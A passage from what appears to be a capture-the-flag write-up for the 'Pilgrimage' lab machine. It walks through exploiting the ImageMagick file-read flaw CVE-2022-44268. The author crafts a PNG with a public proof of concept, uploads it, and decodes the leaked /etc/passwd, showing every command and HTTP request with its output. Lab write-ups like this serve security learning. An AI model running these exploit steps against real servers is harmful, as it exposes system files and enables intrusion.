</span></span><span style="display:flex;"><span>Compiler: gcc <span style="color:#f92672">(</span>7.5<span style="color:#f92672">)</span>
</span></span></code></pre></div><h2 id="local-file-inclusion">Local File Inclusion<a href="#local-file-inclusion" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<p>I have discover a  <code>CVE-2022-44268</code>, I use <code>https://github.com/Sybil-Scan/imagemagick-lfi-poc</code> to exploit it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ gh repo clone Sybil-Scan/imagemagick-lfi-poc
</span></span><span style="display:flex;"><span>Cloning into <span style="color:#e6db74">&#39;imagemagick-lfi-poc&#39;</span>...
</span></span><span style="display:flex;"><span>remote: Enumerating objects: 10, <span style="color:#66d9ef">done</span>.
</span></span><span style="display:flex;"><span>remote: Counting objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
</span></span><span style="display:flex;"><span>remote: Compressing objects: 100% <span style="color:#f92672">(</span>9/9<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
</span></span><span style="display:flex;"><span>remote: Total <span style="color:#ae81ff">10</span> <span style="color:#f92672">(</span>delta 2<span style="color:#f92672">)</span>, reused <span style="color:#ae81ff">6</span> <span style="color:#f92672">(</span>delta 1<span style="color:#f92672">)</span>, pack-reused <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>Receiving objects: 100% <span style="color:#f92672">(</span>10/10<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
</span></span><span style="display:flex;"><span>Resolving deltas: 100% <span style="color:#f92672">(</span>2/2<span style="color:#f92672">)</span>, <span style="color:#66d9ef">done</span>.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ls
</span></span><span style="display:flex;"><span>imagemagick-lfi-poc 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cd  imagemagick-lfi-poc 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ ls
</span></span><span style="display:flex;"><span>generate.py  README.md
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 generate.py -f <span style="color:#e6db74">&#34;/etc/passwd&#34;</span> -o lupin.png 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> ImageMagick LFI PoC - by Sybil Scan Research &lt;research@sybilscan.com&gt;
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Generating Blank PNG
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Blank PNG generated
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> Placing Payload to read /etc/passwd
</span></span><span style="display:flex;"><span>   <span style="color:#f92672">[</span>&gt;<span style="color:#f92672">]</span> PoC PNG generated &gt; lupin.png
</span></span></code></pre></div><p>Now I go in this directory <code>http://pilgrimage.htb/</code> to <code>upload</code> this image:</p>
<ul>
<li>Request:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> / <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">pilgrimage.htb</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">1420</span>
</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">max-age=0</span>
</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://pilgrimage.htb</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">multipart/form-data; boundary=----WebKitFormBoundary1C2vBn2TojVZ6gUR</span>
</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://pilgrimage.htb/</span>
</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.9</span>
</span></span><span style="display:flex;"><span>Cookie<span style="color:#f92672">:</span> <span style="color:#ae81ff">PHPSESSID=jqr0bgdhrmgpc14rrb7buvb31u</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------WebKitFormBoundary1C2vBn2TojVZ6gUR
</span></span><span style="display:flex;"><span>Content-Disposition: form-data; name=&#34;toConvert&#34;; filename=&#34;lupin.png&#34;
</span></span><span style="display:flex;"><span>Content-Type: image/png
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PNG
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span></code></pre></div><ul>
<li>Response:</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">302</span> <span style="color:#a6e22e">Found</span>
</span></span><span style="display:flex;"><span>Server<span style="color:#f92672">:</span> <span style="color:#ae81ff">nginx/1.18.0</span>
</span></span><span style="display:flex;"><span>Date<span style="color:#f92672">:</span> <span style="color:#ae81ff">Wed, 06 Sep 2023 14:09:56 GMT</span>
</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html; charset=UTF-8</span>
</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
</span></span><span style="display:flex;"><span>Expires<span style="color:#f92672">:</span> <span style="color:#ae81ff">Thu, 19 Nov 1981 08:52:00 GMT</span>
</span></span><span style="display:flex;"><span>Cache-Control<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-store, no-cache, must-revalidate</span>
</span></span><span style="display:flex;"><span>Pragma<span style="color:#f92672">:</span> <span style="color:#ae81ff">no-cache</span>
</span></span><span style="display:flex;"><span>Location<span style="color:#f92672">:</span> <span style="color:#ae81ff">/?message=http://pilgrimage.htb/shrunk/64f88834a7752.png&amp;status=success</span>
</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">7625</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  &lt;<span style="color:#f92672">head</span>&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">c</span>
</span></span></code></pre></div><p>Now I go in this directory <code>/shrunk/64f88834a7752.png</code> to <code>download</code> the image, I use <code>cURL</code> to download it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ curl http://pilgrimage.htb/shrunk/64f88834a7752.png -O 64f88834a7752.png
</span></span><span style="display:flex;"><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style="display:flex;"><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">1688</span>  <span style="color:#ae81ff">100</span>  <span style="color:#ae81ff">1688</span>    <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>   <span style="color:#ae81ff">7286</span>      <span style="color:#ae81ff">0</span> --:--:-- --:--:-- --:--:--  <span style="color:#ae81ff">7307</span>
</span></span><span style="display:flex;"><span>                                                    
</span></span></code></pre></div><p>I <code>analyze</code> the converted image using this command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ identify -verbose 64f88834a7752.png 
</span></span><span style="display:flex;"><span>Image: 64f88834a7752.png
</span></span><span style="display:flex;"><span>  Format: PNG <span style="color:#f92672">(</span>Portable Network Graphics<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Geometry: 128x128
</span></span><span style="display:flex;"><span>  Class: DirectClass
</span></span><span style="display:flex;"><span>  Type: true color
</span></span><span style="display:flex;"><span>  Depth: <span style="color:#ae81ff">8</span> bits-per-pixel component
</span></span><span style="display:flex;"><span>  Channel Depths:
</span></span><span style="display:flex;"><span>    Red:      <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>    Green:    <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>    Blue:     <span style="color:#ae81ff">8</span> bits
</span></span><span style="display:flex;"><span>  Channel Statistics:
</span></span><span style="display:flex;"><span>    Red:
</span></span><span style="display:flex;"><span>      Minimum:                   257.00 <span style="color:#f92672">(</span>0.0039<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65021.00 <span style="color:#f92672">(</span>0.9922<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    32639.00 <span style="color:#f92672">(</span>0.4980<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      18978.98 <span style="color:#f92672">(</span>0.2896<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Green:
</span></span><span style="display:flex;"><span>      Minimum:                     0.00 <span style="color:#f92672">(</span>0.0000<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65278.00 <span style="color:#f92672">(</span>0.9961<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    11062.54 <span style="color:#f92672">(</span>0.1688<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      15530.77 <span style="color:#f92672">(</span>0.2370<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    Blue:
</span></span><span style="display:flex;"><span>      Minimum:                   257.00 <span style="color:#f92672">(</span>0.0039<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Maximum:                 65021.00 <span style="color:#f92672">(</span>0.9922<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Mean:                    32639.00 <span style="color:#f92672">(</span>0.4980<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>      Standard Deviation:      18978.98 <span style="color:#f92672">(</span>0.2896<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Gamma: 0.45455
</span></span><span style="display:flex;"><span>  Chromaticity:
</span></span><span style="display:flex;"><span>    red primary: <span style="color:#f92672">(</span>0.64,0.33<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    green primary: <span style="color:#f92672">(</span>0.3,0.6<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    blue primary: <span style="color:#f92672">(</span>0.15,0.06<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    white point: <span style="color:#f92672">(</span>0.3127,0.329<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>  Filesize: 1.6Ki
</span></span><span style="display:flex;"><span>  Interlace: No
</span></span><span style="display:flex;"><span>  Orientation: Unknown
</span></span><span style="display:flex;"><span>  Background Color: white
</span></span><span style="display:flex;"><span>  Border Color: <span style="color:#75715e">#DFDFDF</span>
</span></span><span style="display:flex;"><span>  Matte Color: <span style="color:#75715e">#BDBDBD</span>
</span></span><span style="display:flex;"><span>  Page geometry: 128x128+0+0
</span></span><span style="display:flex;"><span>  Compose: Over
</span></span><span style="display:flex;"><span>  Dispose: Undefined
</span></span><span style="display:flex;"><span>  Iterations: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>  Compression: Zip
</span></span><span style="display:flex;"><span>  Png:IHDR.color-type-orig: <span style="color:#ae81ff">2</span>
</span></span><span style="display:flex;"><span>  Png:IHDR.bit-depth-orig: <span style="color:#ae81ff">8</span>
</span></span><span style="display:flex;"><span>  Raw profile type: 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">1437</span>
</span></span><span style="display:flex;"><span>726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d
</span></span><span style="display:flex;"><span>6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f
</span></span><span style="display:flex;"><span>6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e
</span></span><span style="display:flex;"><span>2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f736269
</span></span><span style="display:flex;"><span>6e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f
</span></span><span style="display:flex;"><span>62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d
</span></span><span style="display:flex;"><span>65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a
</span></span><span style="display:flex;"><span>2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a
</span></span><span style="display:flex;"><span>783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f
</span></span><span style="display:flex;"><span>6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f757372
</span></span><span style="display:flex;"><span>2f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73
</span></span><span style="display:flex;"><span>706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31
</span></span><span style="display:flex;"><span>303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f
</span></span><span style="display:flex;"><span>6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573
</span></span><span style="display:flex;"><span>722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d
</span></span><span style="display:flex;"><span>646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b
</span></span><span style="display:flex;"><span>75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f
</span></span><span style="display:flex;"><span>7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c69
</span></span><span style="display:flex;"><span>7374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67
</span></span><span style="display:flex;"><span>696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f73
</span></span><span style="display:flex;"><span>62696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d
</span></span><span style="display:flex;"><span>5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e
</span></span><span style="display:flex;"><span>6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a3635353334
</span></span><span style="display:flex;"><span>3a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e
</span></span><span style="display:flex;"><span>2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374
</span></span><span style="display:flex;"><span>656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f72
</span></span><span style="display:flex;"><span>6b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d65
</span></span><span style="display:flex;"><span>6e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e
</span></span><span style="display:flex;"><span>0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d642052
</span></span><span style="display:flex;"><span>65736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f
</span></span><span style="display:flex;"><span>6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e65786973
</span></span><span style="display:flex;"><span>74656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573
</span></span><span style="display:flex;"><span>796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e69
</span></span><span style="display:flex;"><span>7a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c
</span></span><span style="display:flex;"><span>6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d
</span></span><span style="display:flex;"><span>652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a78
</span></span><span style="display:flex;"><span>3a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f
</span></span><span style="display:flex;"><span>7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f
</span></span><span style="display:flex;"><span>737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a393938
</span></span><span style="display:flex;"><span>3a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  Date:create: 2023-09-06T14:09:56+00:00
</span></span><span style="display:flex;"><span>  Date:modify: 2023-09-06T14:09:56+00:00
</span></span><span style="display:flex;"><span>  Date:timestamp: 2023-09-06T14:09:56+00:00
</span></span><span style="display:flex;"><span>  Signature: 6eb1ce5d5108a4858c3cf5ba93eda43f449d4a7659a024a2e03436fe9a1f8771
</span></span><span style="display:flex;"><span>  Tainted: False
</span></span><span style="display:flex;"><span>  Elapsed Time: 0m:0.001059s
</span></span><span style="display:flex;"><span>  Pixels Per Second: 14.8Mi
</span></span></code></pre></div><p>The Last Step of <code>PoC</code> is It use python to <code>decode</code> the value within of  <code>Raw profile type</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ nano passwd.py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat  passwd.py
</span></span><span style="display:flex;"><span>print<span style="color:#f92672">(</span>bytes.fromhex<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d6e6574776f726b3a783a3130313a3130323a73797374656d64204e6574776f726b204d616e6167656d656e742c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d7265736f6c76653a783a3130323a3130333a73797374656d64205265736f6c7665722c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a6d6573736167656275733a783a3130333a3130393a3a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a73797374656d642d74696d6573796e633a783a3130343a3131303a73797374656d642054696d652053796e6368726f6e697a6174696f6e2c2c2c3a2f72756e2f73797374656d643a2f7573722f7362696e2f6e6f6c6f67696e0a656d696c793a783a313030303a313030303a656d696c792c2c2c3a2f686f6d652f656d696c793a2f62696e2f626173680a73797374656d642d636f726564756d703a783a3939393a3939393a73797374656d6420436f72652044756d7065723a2f3a2f7573722f7362696e2f6e6f6c6f67696e0a737368643a783a3130353a36353533343a3a2f72756e2f737368643a2f7573722f7362696e2f6e6f6c6f67696e0a5f6c617572656c3a783a3939383a3939383a3a2f7661722f6c6f672f6c617572656c3a2f62696e2f66616c73650a&#34;</span><span style="color:#f92672">)</span>.decode<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;utf-8&#34;</span><span style="color:#f92672">))</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 passwd.py
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style="display:flex;"><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>gnats:x:41:41:Gnats Bug-Reporting System <span style="color:#f92672">(</span>admin<span style="color:#f92672">)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>systemd-timesync:x:104:110:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
</span></span><span style="display:flex;"><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style="display:flex;"><span>_laurel:x:998:998::/var/log/laurel:/bin/false
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/imagemagick-lfi-poc<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ python3 passwd.py | grep /bin/bash
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>emily:x:1000:1000:emily,,,:/home/emily:/bin/bash
</span></span></code></pre></div><p>I see the <code>login</code> and <code>Register</code> page, and I discover a interesting directory:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat  login.php  | grep db      
</span></span><span style="display:flex;"><span>  $db <span style="color:#f92672">=</span> new PDO<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;sqlite:/var/db/pilgrimage&#39;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>  $stmt <span style="color:#f92672">=</span> $db-&gt;prepare<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;SELECT * FROM users WHERE username = ? and password = ?&#34;</span><span style="color:#f92672">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/git-dumper/Pilgrimage<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ cat  register.php  | grep db
